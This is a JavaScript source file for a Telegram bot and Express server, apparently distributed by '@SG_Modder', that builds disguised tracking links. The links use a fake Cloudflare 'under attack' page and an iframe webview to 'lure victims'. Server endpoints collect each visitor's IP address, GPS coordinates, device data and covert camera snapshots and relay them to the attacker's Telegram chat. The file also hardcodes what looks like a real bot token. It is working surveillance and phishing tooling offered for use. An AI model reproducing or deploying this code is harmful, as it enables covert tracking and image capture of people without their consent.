const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const botOwnerId = 1249726999;

// Directly adding the token to the code
const botToken = '6104998193:AAE3w2GAh4QiKTWFsd0sozc_0ilCHsFNnzQ';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(botToken, { polling: true });
const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
const app = express();

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const hostURL = "https://sgmodder.adaptable.app";
let use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
    let ip;
    let d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path !== null) {
        res.render("webview", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    let ip;
    let d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path !== null) {
        res.render("cloudflare", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/SG_Modder1");
    }
});

// Function to create an animated edit effect for a message
async function animatedEditMessage(chatId, messageId, newText) {
    const words = newText.split(' ');
    const wordsPerEdit = 10; // Number of words to edit at once
    const interval = 1000; // Pause between edits (in milliseconds)
    let index = 0;

    while (index < words.length) {
        const endIndex = Math.min(index + wordsPerEdit, words.length);
        const editedText = words.slice(0, endIndex).join(' ');

        await bot.editMessageText(editedText, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: JSON.stringify({ // Include the inline keyboard markup in editMessageText
                "inline_keyboard": [
                    [{ text: "Create Link", callback_data: "crenew" }]
                ]
            })
        });

        index = endIndex;

        if (index < words.length) {
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    }
}

// Usage:
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        // Check if the user is a member of your channel
        const isMember = await bot.getChatMember("@SG_Modder1", msg.from.id);

        // Check if the user is an admin of the channel
        const isAdmin = await bot.getChatMember("@SG_Modder1", msg.from.id);
        const isChannelAdmin = isAdmin && (isAdmin.status === "creator" || isAdmin.status === "administrator");

        if (isMember && isMember.status !== "left") {
            if (msg?.reply_to_message?.text === "🔖 Drop your URL here:") {
                createLink(chatId, msg.text);
            }

         if (msg.text === "/start") {
                const startMessage = `𝙒𝙚𝙡𝙘𝙤𝙢𝙚 ${msg.chat.first_name}! 🎉,
        \n𝒀𝒐𝒖𝒓 𝒄𝒂𝒏 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕 𝒕𝒐 𝒕𝒓𝒂𝒄𝒌 𝒅𝒐𝒘𝒏 𝒑𝒆𝒐𝒑𝒍𝒆 𝒋𝒖𝒔𝒕 𝒕𝒉𝒓𝒐𝒖𝒈𝒉 𝒂 𝒔𝒊𝒎𝒑𝒍𝒆 𝒍𝒊𝒏𝒌. 🌐       
       \n𝑰𝒕 𝒄𝒂𝒏 𝒈𝒂𝒕𝒉𝒆𝒓 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 𝒍𝒊𝒌𝒆 𝒍𝒐𝒄𝒂𝒕𝒊𝒐𝒏, 𝒅𝒆𝒗𝒊𝒄𝒆 𝒅𝒆𝒕𝒂𝒊𝒍𝒔, 𝒂𝒏𝒅 𝒆𝒗𝒆𝒏 𝒄𝒂𝒎𝒆𝒓𝒂 𝒔𝒏𝒂𝒑𝒔. 📱📸       
       \n𝑻𝒉𝒊𝒔 𝒃𝒐𝒕 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 > @SG_Modder😈        
        \n𝑱𝒐𝒊𝒏 𝑴𝒚 𝒄𝒉𝒂𝒏𝒏𝒆𝒍 > @SG_Modder1    
        \n\n𝑻𝒚𝒑𝒆 /help 𝒇𝒐𝒓 𝒎𝒐𝒓𝒆 𝒊𝒏𝒇𝒐. ℹ️
        \n\nClik On Create link Button 👇`;        

                await bot.sendMessage(chatId, startMessage, {
                    reply_markup: JSON.stringify({
                        "inline_keyboard": [
                            [{ text: "Create Link", callback_data: "crenew" }]
                        ]
                    })
                });
            } else if (msg.text === "/create") {
                createNew(chatId);
            } else if (msg.text === "/help") {
                const helpMessage = `
        𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞 𝐛𝐲 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐚 𝐬𝐢𝐦𝐩𝐥𝐞 𝐥𝐢𝐧𝐤. 🕵️‍♂️\n\n       
        𝐒𝐞𝐧𝐝 /𝐜𝐫𝐞𝐚𝐭𝐞 𝐭𝐨 𝐛𝐞𝐠𝐢𝐧; 𝐚𝐟𝐭𝐞𝐫𝐰𝐚𝐫𝐝, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐚𝐬𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐚 𝐔𝐑𝐋, 𝐰𝐡𝐢𝐜𝐡 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐢𝐧 𝐚𝐧 𝐢𝐟𝐫𝐚𝐦𝐞 𝐭𝐨 𝐥𝐮𝐫𝐞 𝐯𝐢𝐜𝐭𝐢𝐦𝐬. 📩\n        
       𝐀𝐟𝐭𝐞𝐫 𝐫𝐞𝐜𝐞𝐢𝐯𝐢𝐧𝐠 𝐭𝐡𝐞 𝐔𝐑𝐋, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮 𝟐 𝐥𝐢𝐧𝐤𝐬 𝐭𝐡𝐚𝐭 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐭𝐨 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞. 🔗👤\n\n      
        𝐒𝐩𝐞𝐜𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬: ℹ️\n      
        𝟏. 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐬𝐡𝐨𝐰𝐬 𝐚 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐮𝐧𝐝𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐩𝐚𝐠𝐞 𝐭𝐨 𝐠𝐚𝐭𝐡𝐞𝐫 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝐭𝐡𝐞𝐧 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐬 𝐭𝐡𝐞 𝐯𝐢𝐜𝐭𝐢𝐦 𝐭𝐨 𝐭𝐡𝐞 𝐝𝐞𝐬𝐭𝐢𝐧𝐚𝐭𝐢𝐨𝐧 𝐔𝐑𝐋. ☁️🛡️\n       
       𝟐. 𝐖𝐞𝐛𝐯𝐢𝐞𝐰 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐬𝐡𝐨𝐰𝐬 𝐚 𝐰𝐞𝐛𝐬𝐢𝐭𝐞 (𝐞.𝐠., 𝐁𝐢𝐧𝐠, 𝐝𝐚𝐭𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬, 𝐞𝐭𝐜.) 𝐮𝐬𝐢𝐧𝐠 𝐚𝐧 𝐢𝐟𝐫𝐚𝐦𝐞 𝐟𝐨𝐫 𝐠𝐚𝐭𝐡𝐞𝐫𝐢𝐧𝐠 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧. ( ⚠️ 𝐌𝐚𝐧𝐲 𝐬𝐢𝐭𝐞𝐬 𝐦𝐚𝐲 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤 𝐮𝐧𝐝𝐞𝐫 𝐭𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐢𝐟 𝐭𝐡𝐞𝐲 𝐡𝐚𝐯𝐞 𝐚𝐧 𝐱-𝐟𝐫𝐚𝐦𝐞 𝐡𝐞𝐚𝐝𝐞𝐫 𝐩𝐫𝐞𝐬𝐞𝐧𝐭, 𝐞.𝐠., [𝐆𝐨𝐨𝐠𝐥𝐞]( https://google.com ) ) 🌐🚫\n\n    
      𝐈𝐅 𝐘𝐎𝐔 𝐅𝐀𝐂𝐄 𝐀𝐍𝐘 𝐎𝐓𝐇𝐄𝐑 𝐏𝐑𝐎𝐁𝐋𝐄𝐌 𝐃𝐌 [  @SG_Modder  ] \𝐧 𝐉𝐎𝐈𝐍 [ @SG_Modder1 ] 🚨    `;

                await bot.sendMessage(chatId, helpMessage);
            }
            // Add other functionalities here accessible to channel members
        } else if (isChannelAdmin) {
            // Add functionalities accessible to channel admins
            if (msg.text === "/admin_command") {
                // Perform admin-specific command
            }
        } else {
            // User is not a member or admin of the channel
            bot.sendMessage(chatId, "To use this bot, please join @SG_Modder1 channel.", {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "Join Channel", url: "https://t.me/SG_Modder1" }]
                    ]
                })
            });
        }
    } catch (error) {
        // Log the error
        console.error("Error occurred:", error);

        // Notify the user about the error
        bot.sendMessage(chatId, "Apologies, something went wrong. Please try again later.");
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data === "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

bot.on('polling_error', (error) => {
    //console.log(error.code); 
});

async function shortenUrlWithIsGd(url) {
    try {
        const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
        if (response.ok) {
            return await response.text();
        } else {
            throw new Error('Failed to shorten URL with is.gd');
        }
    } catch (error) {
        console.error('Error shortening URL with is.gd:', error);
        throw error;
    }
}

async function shortenUrlWithSmolUrl(url) {
    try {
        const apiUrl = 'https://smolurl.com/api/links';
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ url }),
        });

        if (response.ok) {
            const data = await response.json();
            return data.data.short_url;
        } else {
            throw new Error('Failed to shorten URL with SmolUrl');
        }
    } catch (error) {
        console.error('Error shortening URL with SmolUrl:', error);
        throw error;
    }
}

async function createLink(cid, msg) {
    const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
        const url = cid.toString(36) + '/' + btoa(msg);
        const m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create new Link", callback_data: "crenew" }]
                ]
            })
        };

        const cUrl = `${hostURL}/c/${url}`;
        const wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");

        try {
            // Shorten URLs using both is.gd and SmolUrl
            const shortCUrl = await shortenUrlWithIsGd(cUrl);
            const shortWUrl = await shortenUrlWithIsGd(wUrl);

            const smolCUrl = await shortenUrlWithSmolUrl(cUrl);
            const smolWUrl = await shortenUrlWithSmolUrl(wUrl);

            bot.sendMessage(cid, `
    🎉 𝑵𝒆𝒘 𝒍𝒊𝒏𝒌𝒔 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅! 𝒀𝒐𝒖'𝒓𝒆 𝒂𝒍𝒍 𝒔𝒆𝒕 𝒕𝒐 𝒕𝒓𝒂𝒄𝒌:\n\n
    ✅ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌𝒔: ${msg}\n\n
    🚀 URL to Track:\n
    🌐 𝘾𝙡𝙤𝙪𝙙𝙁𝙡𝙖𝙧𝙚 𝙇𝙞𝙣𝙠𝙨 \n\n 😕Some Country Support👇\n☁ ►${shortCUrl}\n\n 😜Whole World Support👇 \n☁ ►  ${smolCUrl}\n\n
    🌐 𝙒𝙚𝙗𝙑𝙞𝙚𝙬 𝙇𝙞𝙣𝙠𝙨 \n\n  😕Some Country Support👇\n🌊= ${shortWUrl}\n\n  😜Whole World Support👇 \n🌊= ${smolWUrl}\n\n\n
       🔍 ᴛʜᴇꜱᴇ ʟɪɴᴋꜱ ᴀʀᴇ ʏᴏᴜʀ ᴛᴏᴏʟꜱ ꜰᴏʀ ᴛʀᴀᴄᴋɪɴɢ ᴘᴜʀᴘᴏꜱᴇꜱ. ᴜᴛɪʟɪᴢᴇ ᴛʜᴇᴍ ʀᴇꜱᴘᴏɴꜱɪʙʟʏ ᴀɴᴅ ᴇᴛʜɪᴄᴀʟʟʏ ᴛᴏ ɢᴀᴛʜᴇʀ ᴛʜᴇ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ʏᴏᴜ ɴᴇᴇᴅ. ꜰᴏʀ ᴀɴʏ ɪɴQᴜɪʀɪᴇꜱ ᴏʀ ᴀꜱꜱɪꜱᴛᴀɴᴄᴇ, ꜰᴇᴇʟ ꜰʀᴇᴇ ᴛᴏ ʀᴇᴀᴄʜ ᴏᴜᴛ. 🛠️\n
    ꜱᴛᴀʏ ɪɴꜰᴏʀᴍᴇᴅ, ꜱᴛᴀʏ ʀᴇꜱᴘᴏɴꜱɪʙʟᴇ! \n\n 🕵𝗗𝗲𝘃= @SG_Modder 
`, m);
        } catch (error) {
            console.error('Error shortening links:', error);
            bot.sendMessage(cid, `Failed to shorten links. Please try again later.`);
        }
    } else {
        bot.sendMessage(cid, `❌❌❌Please Enter a valid URL, including http or https.`);
        createNew(cid);
    }
}

function createNew(cid) {
    const mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🔖 Drop your URL here:`, mk);
}

app.get("/", (req, res) => {
    let ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;
    if (lon !== null && lat !== null && uid !== null && acc !== null) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);
        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

app.post("/", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    let data = decodeURIComponent(req.body.data) || null;
    if (uid !== null && data !== null) {
        data = data.replaceAll("<br>", "\n");
        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
        res.send("Done");
    }
});

app.post("/camsnap", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;
    if (uid !== null && img !== null) {
        const buffer = Buffer.from(img, 'base64');
        const info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };
        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }
        res.send("Done");
    }
});

app.listen(5000, () => {
    console.log("App Running on Port 5000!");
});
